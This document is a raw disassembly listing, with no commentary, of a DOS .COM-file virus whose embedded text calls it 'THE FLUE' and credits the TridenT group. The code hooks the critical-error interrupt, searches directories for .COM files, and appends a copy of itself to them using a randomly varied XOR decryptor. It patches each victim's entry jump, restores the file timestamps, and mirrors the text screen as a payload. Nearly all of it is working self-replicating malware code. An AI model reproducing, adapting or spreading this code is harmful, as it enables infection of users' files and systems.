
1000:0000                  Proc3:                      
1000:0000 cd 20                     INT    20h        ;Exit
1000:0079                  Data37:                     
1000:0100 e4 40            Main:    IN     AL, 40h    
1000:0102 86 e0                     XCHG   AH, AL     
1000:0104 e4 40                     IN     AL, 40h    
1000:0106 a3 a205                   MOV    WORD PTR [Data0], AX 
1000:0109 be 1601                   MOV    SI, 0116h  
1000:010c e8 8f04                   CALL   Proc0      
1000:010f e9 0100                   JMP    Jmp0       
1000:0112                           db     c3         
1000:0113                  Jmp0:                       
1000:0113 e8 8404                   CALL   Proc1      
1000:0116                  Data9:                      
1000:0116 e8 0000                   CALL   Proc2      
1000:0119                  Proc2:                      
1000:0119 5d                        POP    BP         
1000:011a 81 ed 1901                SUB    BP, 0119h  
1000:011e eb 01                     JMP    Jmp1       
1000:0120                           db     81         
1000:0121                  Jmp1:                       
1000:0121 e4 21                     IN     AL, 21h    
1000:0123 0c 02                     OR     AL, 02h    
1000:0125 e6 21                     OUT    AL, 21h    
1000:0127 b9 0300                   MOV    CX, 0003h  
1000:012a bf 0001                   MOV    DI, 0100h  
1000:012d 57                        PUSH   DI         
1000:012e 8d b6 5204                LEA    SI, WORD PTR [BP+Data1] 
1000:0132 fc                        CLD               
1000:0133 f3                        REPNZ             
1000:0134 a4                        MOVSB             
1000:0135 b4 47                     MOV    AH, 47h    
1000:0137 32 d2                     XOR    DL, DL     
1000:0139 8d b6 ae04                LEA    SI, WORD PTR [BP+Data2] 
1000:013d cd 21                     INT    21h        ;Get current directory
1000:013f b4 2f                     MOV    AH, 2fh    
1000:0141 cd 21                     INT    21h        ;Get DTA
1000:0143 06                        PUSH   ES         
1000:0144 53                        PUSH   BX         
1000:0145 b8 2435                   MOV    AX, 3524h  
1000:0148 cd 21                     INT    21h        ;Get int vector 0x24
1000:014a 3e                                          
1000:014b 89 9e ee04                MOV    WORD PTR DS:[BP+Data3], BX 
1000:014f 3e                                          
1000:0150 8c 86 f004                MOV    WORD PTR DS:[BP+Data4], ES 
1000:0154 0e                        PUSH   CS         
1000:0155 07                        POP    ES         
1000:0156 fa                        CLI               
1000:0157 b4 25                     MOV    AH, 25h    
1000:0159 8d 96 4004                LEA    DX, WORD PTR [BP+Data5] 
1000:015d cd 21                     INT    21h        ;Set int vector 0x24
1000:015f fb                        STI               
1000:0160 3e                                          
1000:0161 83 be a205 00             CMP    WORD PTR DS:[BP+Data6], 00h 
1000:0166 75 03                     JNZ    Jmp2       
1000:0168 e9 4602                   JMP    Jmp3       
1000:016b                  Jmp2:                       
1000:016b b4 1a                     MOV    AH, 1ah    
1000:016d 8d 96 6104                LEA    DX, WORD PTR [BP+Data11] 
1000:0171 cd 21                     INT    21h        ;Set DTA
1000:0173 e8 b402                   CALL   Proc4      
1000:0176 b1 05                     MOV    CL, 05h    
1000:0178 d2 e8                     SHR    AL, CL     
1000:017a fe c0                     INC    AL         
1000:017c 3e                                          
1000:017d 88 86 5104                MOV    BYTE PTR DS:[BP+Data12], AL 
1000:0181                  Jmp7:                       
1000:0181 b4 4e                     MOV    AH, 4eh    
1000:0183 8d 96 5804                LEA    DX, WORD PTR [BP+Data13] 
1000:0187 eb 31                     JMP    Jmp5       
1000:0189                           db     90         
1000:018a                  Jmp10:                      
1000:018a b8 0157                   MOV    AX, 5701h  
1000:018d 3e                                          
1000:018e 8b 8e 7704                MOV    CX, WORD PTR DS:[BP+Data17] 
1000:0192 3e                                          
1000:0193 8b 96 7904                MOV    DX, WORD PTR DS:[BP+Data18] 
1000:0197 cd 21                     INT    21h        ;Get/set file timestamp
1000:0199 b4 3e                     MOV    AH, 3eh    
1000:019b cd 21                     INT    21h        ;Close file
1000:019d b8 0143                   MOV    AX, 4301h  
1000:01a0 32 ed                     XOR    CH, CH     
1000:01a2 3e                                          
1000:01a3 8a 8e 7604                MOV    CL, BYTE PTR DS:[BP+Data19] 
1000:01a7 8d 96 7f04                LEA    DX, WORD PTR [BP+Data15] 
1000:01ab cd 21                     INT    21h        ;Change file attributes
1000:01ad 3e                                          
1000:01ae 80 be 5104 00             CMP    BYTE PTR DS:[BP+Data12], 00h 
1000:01b3 75 03                     JNZ    Jmp12      
1000:01b5 e9 f901                   JMP    Jmp3       
1000:01b8                  Jmp12:                      
1000:01b8 b4 4f                     MOV    AH, 4fh    
1000:01ba                  Jmp5:                       
1000:01ba b9 0600                   MOV    CX, 0006h  
1000:01bd cd 21                     INT    21h        ;Find file
1000:01bf 73 12                     JNB    Jmp6       
1000:01c1 3e                                          
1000:01c2 fe 86 5104                INC    BYTE PTR DS:[BP+Data12] 
1000:01c6 b4 3b                     MOV    AH, 3bh    
1000:01c8 8d 96 5e04                LEA    DX, WORD PTR [BP+Data14] 
1000:01cc cd 21                     INT    21h        ;Change directory
1000:01ce 73 b1                     JNB    Jmp7       
1000:01d0 e9 de01                   JMP    Jmp3       
1000:01d3                  Jmp6:                       
1000:01d3 b8 0143                   MOV    AX, 4301h  
1000:01d6 33 c9                     XOR    CX, CX     
1000:01d8 8d 96 7f04                LEA    DX, WORD PTR [BP+Data15] 
1000:01dc cd 21                     INT    21h        ;Change file attributes
1000:01de b8 023d                   MOV    AX, 3d02h  
1000:01e1 cd 21                     INT    21h        ;Open file
1000:01e3 73 03                     JNB    Jmp8       
1000:01e5 e9 c901                   JMP    Jmp3       
1000:01e8                  Jmp8:                       
1000:01e8 93                        XCHG   AX, BX     
1000:01e9 83 fb 04                  CMP    BX, 04h    
1000:01ec 77 03                     JA     Jmp9       
1000:01ee e9 c001                   JMP    Jmp3       
1000:01f1                  Jmp9:                       
1000:01f1 3e                                          
1000:01f2 89 9e 4f04                MOV    WORD PTR DS:[BP+Data16], BX 
1000:01f6 b4 3f                     MOV    AH, 3fh    
1000:01f8 b9 0300                   MOV    CX, 0003h  
1000:01fb 8d 96 5204                LEA    DX, WORD PTR [BP+Data1] 
1000:01ff cd 21                     INT    21h        ;Read file
1000:0201 e8 0302                   CALL   Proc5      
1000:0204 3d 73bb                   CMP    AX, bb73h  
1000:0207 73 81                     JNB    Jmp10      
1000:0209 3d f401                   CMP    AX, 01f4h  
1000:020c 73 03                     JNB    Jmp11      
1000:020e e9 79ff                   JMP    Jmp10      
1000:0211                  Jmp11:                      
1000:0211 3e                                          
1000:0212 80 be 5204 e9             CMP    BYTE PTR DS:[BP+Data1], e9h 
1000:0217 75 0d                     JNZ    Jmp13      
1000:0219 3e                                          
1000:021a 2b 86 5304                SUB    AX, WORD PTR DS:[BP+Data20] 
1000:021e 3d 9e04                   CMP    AX, 049eh  
1000:0221 75 03                     JNZ    Jmp13      
1000:0223 e9 64ff                   JMP    Jmp10      
1000:0226                  Jmp13:                      
1000:0226 e8 0102                   CALL   Proc4      
1000:0229 b1 06                     MOV    CL, 06h    
1000:022b d3 e8                     SHR    AX, CL     
1000:022d 50                        PUSH   AX         
1000:022e e8 f901                   CALL   Proc4      
1000:0231 92                        XCHG   AX, DX     
1000:0232 33 c0                     XOR    AX, AX     
1000:0234 8e d8                     MOV    DS, AX     
1000:0236 b4 40                     MOV    AH, 40h    
1000:0238 59                        POP    CX         
1000:0239 cd 21                     INT    21h        ;Write file
1000:023b 0e                        PUSH   CS         
1000:023c 1f                        POP    DS         
1000:023d e8 c701                   CALL   Proc5      
1000:0240 e8 e701                   CALL   Proc4      
1000:0243 0b c0                     OR     AX, AX     
1000:0245 75 03                     JNZ    Jmp14      
1000:0247 e9 6701                   JMP    Jmp3       
1000:024a                  Jmp14:                      
1000:024a 3e                                          
1000:024b 89 86 a205                MOV    WORD PTR DS:[BP+Data6], AX 
1000:024f 3e                                          
1000:0250 89 9e 8105                MOV    WORD PTR DS:[BP+Data21], BX 
1000:0254 b9 2600                   MOV    CX, 0026h  
1000:0257 8d b6 7405                LEA    SI, WORD PTR [BP+Data22] 
1000:025b 8d be ad05                LEA    DI, WORD PTR [BP+Data8] 
1000:025f fc                        CLD               
1000:0260 f3                        REPNZ             
1000:0261 a4                        MOVSB             
1000:0262 e8 b701                   CALL   Proc6      
1000:0265 d0 e8                     SHR    AL, 1      
1000:0267 3c 02                     CMP    AL, 02h    
1000:0269 72 1f                     JB     Jmp15      
1000:026b 77 3a                     JA     Jmp16      
1000:026d 3e                                          
1000:026e c6 86 9b05 e3             MOV    BYTE PTR DS:[BP+Data23], e3h 
1000:0273 3e                                          
1000:0274 c6 86 9d05 37             MOV    BYTE PTR DS:[BP+Data24], 37h 
1000:0279 3e                                          
1000:027a c7 86 a405 3104           MOV    WORD PTR DS:[BP+Jmp4], 0431h 
1000:0280 3e                                          
1000:0281 c7 86 a805 4646           MOV    WORD PTR DS:[BP+Data25], 4646h 
1000:0287 eb 38                     JMP    Jmp17      
1000:0289                           db     90         
1000:028a                  Jmp15:                      
1000:028a 3e                                          
1000:028b c6 86 9b05 e7             MOV    BYTE PTR DS:[BP+Data23], e7h 
1000:0290 3e                                          
1000:0291 c6 86 9d05 1d             MOV    BYTE PTR DS:[BP+Data24], 1dh 
1000:0296 3e                                          
1000:0297 c7 86 a405 3107           MOV    WORD PTR DS:[BP+Jmp4], 0731h 
1000:029d 3e                                          
1000:029e c7 86 a805 4343           MOV    WORD PTR DS:[BP+Data25], 4343h 
1000:02a4 eb 1b                     JMP    Jmp17      
1000:02a6                           db     90         
1000:02a7                  Jmp16:                      
1000:02a7 3e                                          
1000:02a8 c6 86 9b05 e6             MOV    BYTE PTR DS:[BP+Data23], e6h 
1000:02ad 3e                                          
1000:02ae c6 86 9d05 3c             MOV    BYTE PTR DS:[BP+Data24], 3ch 
1000:02b3 3e                                          
1000:02b4 c7 86 a405 3105           MOV    WORD PTR DS:[BP+Jmp4], 0531h 
1000:02ba 3e                                          
1000:02bb c7 86 a805 4747           MOV    WORD PTR DS:[BP+Data25], 4747h 
1000:02c1                  Jmp17:                      
1000:02c1 e8 5801                   CALL   Proc6      
1000:02c4 3c 04                     CMP    AL, 04h    
1000:02c6 72 1c                     JB     Jmp18      
1000:02c8 3e                                          
1000:02c9 80 be 9a05 46             CMP    BYTE PTR DS:[BP+Proc1], 46h 
1000:02ce 72 08                     JB     Jmp19      
1000:02d0 77 0c                     JA     Jmp20      
1000:02d2 3c 05                     CMP    AL, 05h    
1000:02d4 75 62                     JNZ    Jmp21      
1000:02d6 eb e9                     JMP    Jmp17      
1000:02d8                  Jmp19:                      
1000:02d8 3c 04                     CMP    AL, 04h    
1000:02da 75 47                     JNZ    Jmp24      
1000:02dc eb e3                     JMP    Jmp17      
1000:02de                  Jmp20:                      
1000:02de 3c 06                     CMP    AL, 06h    
1000:02e0 75 6b                     JNZ    Jmp23      
1000:02e2 eb dd                     JMP    Jmp17      
1000:02e4                  Jmp18:                      
1000:02e4 3c 02                     CMP    AL, 02h    
1000:02e6 72 17                     JB     Jmp25      
1000:02e8 77 24                     JA     Jmp26      
1000:02ea 3e                                          
1000:02eb c6 86 a105 ba             MOV    BYTE PTR DS:[BP+Data26], bah 
1000:02f0 3e                                          
1000:02f1 80 86 a505 10             ADD    BYTE PTR DS:[BP+Data27], 10h 
1000:02f6 3e                                          
1000:02f7 c6 86 a705 d2             MOV    BYTE PTR DS:[BP+Data28], d2h 
1000:02fc eb 61                     JMP    Jmp22      
1000:02fe                           db     90         
1000:02ff                  Jmp25:                      
1000:02ff 3e                                          
1000:0300 c6 86 a105 b8             MOV    BYTE PTR DS:[BP+Data26], b8h 
1000:0305 3e                                          
1000:0306 c6 86 a705 d0             MOV    BYTE PTR DS:[BP+Data28], d0h 
1000:030b eb 52                     JMP    Jmp22      
1000:030d                           db     90         
1000:030e                  Jmp26:                      
1000:030e 3e                                          
1000:030f c6 86 a105 bd             MOV    BYTE PTR DS:[BP+Data26], bdh 
1000:0314 3e                                          
1000:0315 80 86 a505 28             ADD    BYTE PTR DS:[BP+Data27], 28h 
1000:031a 3e                                          
1000:031b c6 86 a705 d5             MOV    BYTE PTR DS:[BP+Data28], d5h 
1000:0320 eb 3d                     JMP    Jmp22      
1000:0322                           db     90         
1000:0323                  Jmp24:                      
1000:0323 3e                                          
1000:0324 c6 86 a105 bb             MOV    BYTE PTR DS:[BP+Data26], bbh 
1000:0329 3e                                          
1000:032a 80 86 a505 18             ADD    BYTE PTR DS:[BP+Data27], 18h 
1000:032f 3e                                          
1000:0330 c6 86 a705 d3             MOV    BYTE PTR DS:[BP+Data28], d3h 
1000:0335 eb 28                     JMP    Jmp22      
1000:0337                           db     90         
1000:0338                  Jmp21:                      
1000:0338 3e                                          
1000:0339 c6 86 a105 be             MOV    BYTE PTR DS:[BP+Data26], beh 
1000:033e 3e                                          
1000:033f 80 86 a505 30             ADD    BYTE PTR DS:[BP+Data27], 30h 
1000:0344 3e                                          
1000:0345 c6 86 a705 d6             MOV    BYTE PTR DS:[BP+Data28], d6h 
1000:034a eb 13                     JMP    Jmp22      
1000:034c                           db     90         
1000:034d                  Jmp23:                      
1000:034d 3e                                          
1000:034e c6 86 a105 bf             MOV    BYTE PTR DS:[BP+Data26], bfh 
1000:0353 3e                                          
1000:0354 80 86 a505 38             ADD    BYTE PTR DS:[BP+Data27], 38h 
1000:0359 3e                                          
1000:035a c6 86 a705 d7             MOV    BYTE PTR DS:[BP+Data28], d7h 
1000:035f                  Jmp22:                      
1000:035f 8d b6 1601                LEA    SI, WORD PTR [BP+Data9] 
1000:0363 8b fe                     MOV    DI, SI     
1000:0365 8b de                     MOV    BX, SI     
1000:0367 55                        PUSH   BP         
1000:0368 e8 3302                   CALL   Proc0      
1000:036b 5d                        POP    BP         
1000:036c b8 0042                   MOV    AX, 4200h  
1000:036f 3e                                          
1000:0370 8b 9e 4f04                MOV    BX, WORD PTR DS:[BP+Data16] 
1000:0374 33 c9                     XOR    CX, CX     
1000:0376 33 d2                     XOR    DX, DX     
1000:0378 cd 21                     INT    21h        ;Seek on file
1000:037a b4 40                     MOV    AH, 40h    
1000:037c b9 0300                   MOV    CX, 0003h  
1000:037f 8d 96 5504                LEA    DX, WORD PTR [BP+Data29] 
1000:0383 cd 21                     INT    21h        ;Write file
1000:0385 b8 00b8                   MOV    AX, b800h  
1000:0388 8e c0                     MOV    ES, AX     
1000:038a 8e d8                     MOV    DS, AX     
1000:038c 33 f6                     XOR    SI, SI     
1000:038e 33 ff                     XOR    DI, DI     
1000:0390 b9 1800                   MOV    CX, 0018h  
1000:0393 51                        PUSH   CX         
1000:0394 b9 5000                   MOV    CX, 0050h  
1000:0397 ad                        LODSW             
1000:0398 50                        PUSH   AX         
1000:0399 e2 fc                     LOOP   Data30     
1000:039b b9 5000                   MOV    CX, 0050h  
1000:039e 58                        POP    AX         
1000:039f ab                        STOSW             
1000:03a0 e2 fc                     LOOP   Data31     
1000:03a2 59                        POP    CX         
1000:03a3 e2 ee                     LOOP   Data32     
1000:03a5 0e                        PUSH   CS         
1000:03a6 0e                        PUSH   CS         
1000:03a7 1f                        POP    DS         
1000:03a8 07                        POP    ES         
1000:03a9 3e                                          
1000:03aa fe 8e 5104                DEC    BYTE PTR DS:[BP+Data12] 
1000:03ae e9 d9fd                   JMP    Jmp10      
1000:03b1                  Jmp3:                       
1000:03b1 8d b6 ce03                LEA    SI, WORD PTR [BP+Data7] 
1000:03b5 8d be ad05                LEA    DI, WORD PTR [BP+Data8] 
1000:03b9 b9 3900                   MOV    CX, 0039h  
1000:03bc fc                        CLD               
1000:03bd f3                        REPNZ             
1000:03be a4                        MOVSB             
1000:03bf 8d b6 1601                LEA    SI, WORD PTR [BP+Data9] 
1000:03c3 8b fe                     MOV    DI, SI     
1000:03c5 8b de                     MOV    BX, SI     
1000:03c7 b9 c901                   MOV    CX, 01c9h  
1000:03ca 55                        PUSH   BP         
1000:03cb e9 d601                   JMP    Jmp4       
1000:03ce                  Data7:                      
1000:03ce                           db     5d,b8,24,25,3e,8b,96,f0,04,8e,da,3e,8b,96,ee,04,cd,21,b4,1a 
1000:03e2                           db     5a,1f,cd,21,0e,1f,b4,3b,8d,96,ad,04,cd,21,e4,21,24,fd,e6,21 
1000:03f6                           db     33,c0,33,db,33,c9,33,d2,33,ed,be,00,01,bf,00,01,c3 
1000:0407                  Proc5:                      
1000:0407 b8 0242                   MOV    AX, 4202h  
1000:040a 33 c9                     XOR    CX, CX     
1000:040c 33 d2                     XOR    DX, DX     
1000:040e cd 21                     INT    21h        ;Seek on file
1000:0410 2d 0300                   SUB    AX, 0003h  
1000:0413 3e                                          
1000:0414 89 86 5604                MOV    WORD PTR DS:[BP+Data41], AX 
1000:0418 05 0300                   ADD    AX, 0003h  
1000:041b c3                        RET               
1000:041c                  Proc6:                      
1000:041c e8 0b00                   CALL   Proc4      
1000:041f 24 0f                     AND    AL, 0fh    
1000:0421 d0 e8                     SHR    AL, 1      
1000:0423 3c 05                     CMP    AL, 05h    
1000:0425 77 f5                     JA     Proc6      
1000:0427 fe c0                     INC    AL         
1000:0429 c3                        RET               
1000:042a                  Proc4:                      
1000:042a b4 2c                     MOV    AH, 2ch    
1000:042c cd 21                     INT    21h        ;Get time
1000:042e 86 ea                     XCHG   CH, DL     
1000:0430 90                        NOP               
1000:0431 b4 2c                     MOV    AH, 2ch    
1000:0433 cd 21                     INT    21h        ;Get time
1000:0435 86 ca                     XCHG   CL, DL     
1000:0437 e4 40                     IN     AL, 40h    
1000:0439 86 e0                     XCHG   AH, AL     
1000:043b e4 40                     IN     AL, 40h    
1000:043d 33 c1                     XOR    AX, CX     
1000:043f c3                        RET               
1000:0440                  Data5:                      
1000:0440                           db     b9,09,00,58,e2,fd,5d,1f,07,5a,1f,9d,e9,62,ff,00,00,00,eb,10 
1000:044f                  Data16:                     
1000:0451                  Data12:                     
1000:0452                  Data1:                      
1000:0453                  Data20:                     
1000:0454                           db     90,e9,fd,fe 
1000:0455                  Data29:                     
1000:0456                  Data41:                     
1000:0458                  Data13:                     
1000:0458                           db     '*.COM'    
1000:045d                           db     00,2e,2e,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:045e                  Data14:                     
1000:0461                  Data11:                     
1000:0471                           db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:0476                  Data19:                     
1000:0477                  Data17:                     
1000:0479                  Data18:                     
1000:047f                  Data15:                     
1000:0485                           db     00,00,00,00,00,00,00,20,22,9d,ed,e6,20,e0 
1000:0493 e2 ee                     LOOP   Data33     
1000:0495 20 f3                     AND    BL, DH     
1000:0497 ad                        LODSW             
1000:0498 87 de                     XCHG   BX, SI     
1000:049a 3c 22                     CMP    AL, 22h    
1000:049c 2c 20                     SUB    AL, 20h    
1000:049e f3                        REPNZ             
1000:049f e0 79                     LOOPNZ Data34     
1000:04a1 f3                        REPNZ             
1000:04a2 3a 20                     CMP    AH, BYTE PTR [BX+SI] 
1000:04a4 5b                        POP    BX         
1000:04a5 44                        INC    SP         
1000:04a6 e0 52                     LOOPNZ Data35     
1000:04a8                           db     6b,52,e0,59,5d,5c,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:04ae                  Data2:                      
1000:04bc                           db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:04d0                           db     00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:04e4                           db     00,00,00,00,00,00,00,00,00,00,00,00,00,00 
1000:04ee                  Data3:                      
1000:04f0                  Data4:                      
1000:04f2                           db     'Hatsjeee' 
1000:04fa 6b 52 e0 595d             XOR    WORD PTR [BP+SIData36], 5d59h 
1000:04fc 20 28                     AND    BYTE PTR [BX+SI], CH 
1000:04fe 43                        INC    BX         
1000:04ff 29 20                     SUB    WORD PTR [BX+SI], SP 
1000:0501 31 39                     XOR    WORD PTR [BX+DI], DI 
1000:0503 39 32                     CMP    WORD PTR [BP+SI], SI 
1000:0505 2f                        DAS               
1000:0506 31 39                     XOR    WORD PTR [BX+DI], DI 
1000:0508 39 33                     CMP    WORD PTR [BP+DI], SI 
1000:050a 20 62 79                  AND    BYTE PTR [BP+SI+Data37], AH 
1000:050d 20 54 72                  AND    BYTE PTR [SI+Data38], DL 
1000:0510                           db     'idenT / [D' 
1000:051a 69 64 65 6e54             XOR    WORD PTR [SI+Data39], 546eh 
1000:051c                           db     6b,52,e0   
1000:051f                           db     'Y]Oh, BTW it's from ' 
1000:0533                           db     'Holland, and is call' 
1000:0547                           db     'ed THE FLUEFor those' 
1000:055b                           db     ' who are interested' 
1000:056e 6b 52 e0 595d             XOR    WORD PTR [BP+SIData36], 5d59h 
1000:056f 2e                                          
1000:0570 2e                                          
1000:0571 2e                                          
1000:0572 2e                                          
1000:0573 2e                                          
1000:0574                  Data22:                     
1000:0574 58                        POP    AX         
1000:0575 5d                        POP    BP         
1000:0576 55                        PUSH   BP         
1000:0577 50                        PUSH   AX         
1000:0578 3e                                          
1000:0579 c6 86 ad05 c3             MOV    BYTE PTR DS:[BP+Data8], c3h 
1000:057e b4 40                     MOV    AH, 40h    
1000:0580 bb 0000                   MOV    BX, 0000h  
1000:0581                  Data21:                     
1000:0583 b9 9b04                   MOV    CX, 049bh  
1000:0586 8d 96 1301                LEA    DX, WORD PTR [BP+Jmp0] 
1000:058a cd 21                     INT    21h        ;Write file
1000:058c 8d be 9e05                LEA    DI, WORD PTR [BP+Proc0] 
1000:0590 57                        PUSH   DI         
1000:0591 8d b6 1601                LEA    SI, WORD PTR [BP+Data9] 
1000:0595 8b fe                     MOV    DI, SI     
1000:0597 8b de                     MOV    BX, SI     
1000:0599 c3                        RET               
1000:059a                  Proc1:                      
1000:059a 89 e3                     MOV    BX, SP     
1000:059b                  Data23:                     
1000:059c 8b 37                     MOV    SI, WORD PTR [BX] 
1000:059d                  Data24:                     
1000:059e                  Proc0:                      
1000:059e b9 4002                   MOV    CX, 0240h  
1000:05a1                  Data26:                     
1000:05a1 b8 0000                   MOV    AX, 0000h  
1000:05a2                  Data6:                      
1000:05a4                  Jmp4:                       
1000:05a4 31 04                     XOR    WORD PTR [SI], AX 
1000:05a5                  Data27:                     
1000:05a6 f7 d0                     NOT    AX         
1000:05a7                  Data28:                     
1000:05a8                  Data25:                     
1000:05a8 46                        INC    SI         
1000:05a9 46                        INC    SI         
1000:05aa 49                        DEC    CX         
1000:05ab 75 f7                     JNZ    Jmp4       
1000:05ad                  Data8:                      
1000:05ad c3                        RET               
1000:ffe0                  Data36:                     
2f18:0393                  Data32:                     
2f18:0397                  Data30:                     
2f18:039e                  Data31:                     
2f18:0483                  Data33:                     
2f18:04fa                  Data35:                     
2f18:051a                  Data34:                     
2f18:056e                  Data40:                     
2f18:05a2                  Data0:                      
eda4:0000                  Data10:                     
eda4:0065                  Data39:                     
eda4:0072                  Data38:                     
